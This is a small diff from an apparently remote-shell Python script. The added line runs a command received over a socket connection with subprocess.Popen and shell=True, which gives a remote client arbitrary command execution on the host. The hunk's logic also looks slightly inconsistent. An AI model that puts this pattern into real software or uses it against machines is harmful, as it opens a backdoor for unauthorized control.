@@ -68,6 +68,7 @@ while passwords_match == True:
                 print("cd did not work")
         else:
             try:
+                op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                 client.send(("Nothing was typed").encode())
                 print("Sending response...")
             except:
